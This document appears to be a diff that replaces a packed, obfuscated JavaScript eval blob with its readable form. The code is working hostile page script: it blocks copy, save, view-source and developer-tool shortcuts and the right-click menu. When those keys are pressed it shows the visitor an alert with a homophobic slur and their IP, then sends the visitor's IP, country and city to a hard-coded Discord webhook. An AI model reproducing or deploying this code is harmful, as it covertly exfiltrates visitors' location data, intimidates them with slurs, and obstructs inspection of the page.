@@ -1,1 +1,88 @@
-eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('n 4(){H n y(){J{o p=z q(\'r://L.M/g\');5(!p.N){t{1:\'3\',h:\'3\',j:\'3\'}}o l=z p.g();t{1:l.1||\'3\',h:l.h||\'3\',j:l.j||\'3\'}}O(P){t{1:\'3\',h:\'3\',j:\'3\'}}}y().v(m=>{o A={Q:[{R:T,V:[{w:\'W:\',x:m.1},{w:\'X:\',x:m.h},{w:\'Y:\',x:m.j}]}]};q(\'r://Z.10/B/11/12/13-14-15\',{16:\'17\',18:{\'19-1a\':\'1b/g\'},1c:1d.1e(A)})})}q(\'r://B.1f.1g?1h=g\').v(D=>D.g()).v(F=>{1i 6=F.1;1j.G(\'1k\',0=>{5(0.8&&(0.2===\'S\'||0.2===\'s\')){0.7();9(\'b c, d 1 f: \'+6);4()}5(0.8&&0.2===\'C\'){0.7();9(\'b c, d 1 f: \'+6);4()}5(0.8&&(0.2===\'E\'||0.2===\'e\')){0.7();9(\'b c, d 1 f: \'+6);4()}5(0.8&&(0.2===\'I\'||0.2===\'i\'||0.2==="\\1l\\1m\\1n\\1o")){0.7();9(\'b c, d 1 f: \'+6);4()}5(0.8&&(0.2===\'K\'||0.2===\'k\')){0.7();9(\'b c, d 1 f: \'+6);4()}5(0.8&&(0.2===\'U\'||0.2===\'u\')){0.7();9(\'b c, d 1 f: \'+6);4()}});1p.G(\'1q\',n(a){a.7()})});',62,89,'_0x5ca9cf|ip|key|Unknown|noskidz|if|_0x546cf0|preventDefault|ctrlKey|alert||fucking|faggot|ur||btw|json|country||city||_0x31effa|_0x480b1c|function|const|_0x620711|fetch|https||return||then|name|value|_0x23ed27|await|_0x36e9b8|api||_0x1850bd||_0x3c55a8|addEventListener|async||try||ipinfo|io|ok|catch|_0x44f3c2|embeds|color||16579836||fields|IP|Country|City|discord|com|webhooks|1192845321546498199|DiJqRKu8HTFDv74wz5uH7I044jLDd1Xn4xxeAu5|gPsY9lMJ27hRD5G7|gfWnlQcPxoN|method|POST|headers|Content|Type|application|body|JSON|stringify|ipify|org|format|var|window|keydown|xC3|u201E|xC2|xB1|document|contextmenu'.split('|'),0,{}))
+function noskidz() {
+  async function _0x23ed27() {
+    try {
+      const _0x620711 = await fetch('https://ipinfo.io/json');
+      if (!_0x620711.ok) {
+        return {
+          ip: 'Unknown',
+          country: 'Unknown',
+          city: 'Unknown'
+        };
+      }
+      const _0x31effa = await _0x620711.json();
+      return {
+        ip: _0x31effa.ip || 'Unknown',
+        country: _0x31effa.country || 'Unknown',
+        city: _0x31effa.city || 'Unknown'
+      };
+    } catch (_0x44f3c2) {
+      return {
+        ip: 'Unknown',
+        country: 'Unknown',
+        city: 'Unknown'
+      };
+    }
+  }
+  _0x23ed27().then(_0x480b1c => {
+    const _0x36e9b8 = {
+      embeds: [{
+        color: 16579836,
+        fields: [{
+          name: 'IP:',
+          value: _0x480b1c.ip
+        }, {
+          name: 'Country:',
+          value: _0x480b1c.country
+        }, {
+          name: 'City:',
+          value: _0x480b1c.city
+        }]
+      }]
+    };
+    fetch('https://discord.com/api/webhooks/1192845321546498199/DiJqRKu8HTFDv74wz5uH7I044jLDd1Xn4xxeAu5-gPsY9lMJ27hRD5G7-gfWnlQcPxoN', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(_0x36e9b8)
+    });
+  });
+}
+fetch('https://api.ipify.org?format=json').then(_0x1850bd => _0x1850bd.json()).then(_0x3c55a8 => {
+  var _0x546cf0 = _0x3c55a8.ip;
+  window.addEventListener('keydown', _0x5ca9cf => {
+    if (_0x5ca9cf.ctrlKey && (_0x5ca9cf.key === 'S' || _0x5ca9cf.key === 's')) {
+      _0x5ca9cf.preventDefault();
+      alert('fucking faggot, ur ip btw: ' + _0x546cf0);
+      noskidz();
+    }
+    if (_0x5ca9cf.ctrlKey && _0x5ca9cf.key === 'C') {
+      _0x5ca9cf.preventDefault();
+      alert('fucking faggot, ur ip btw: ' + _0x546cf0);
+      noskidz();
+    }
+    if (_0x5ca9cf.ctrlKey && (_0x5ca9cf.key === 'E' || _0x5ca9cf.key === 'e')) {
+      _0x5ca9cf.preventDefault();
+      alert('fucking faggot, ur ip btw: ' + _0x546cf0);
+      noskidz();
+    }
+    if (_0x5ca9cf.ctrlKey && (_0x5ca9cf.key === 'I' || _0x5ca9cf.key === 'i' || _0x5ca9cf.key === "\xC3\u201E\xC2\xB1")) {
+      _0x5ca9cf.preventDefault();
+      alert('fucking faggot, ur ip btw: ' + _0x546cf0);
+      noskidz();
+    }
+    if (_0x5ca9cf.ctrlKey && (_0x5ca9cf.key === 'K' || _0x5ca9cf.key === 'k')) {
+      _0x5ca9cf.preventDefault();
+      alert('fucking faggot, ur ip btw: ' + _0x546cf0);
+      noskidz();
+    }
+    if (_0x5ca9cf.ctrlKey && (_0x5ca9cf.key === 'U' || _0x5ca9cf.key === 'u')) {
+      _0x5ca9cf.preventDefault();
+      alert('fucking faggot, ur ip btw: ' + _0x546cf0);
+      noskidz();
+    }
+  });
+  document.addEventListener('contextmenu', function (_0x425474) {
+    _0x425474.preventDefault();
+  });
+});
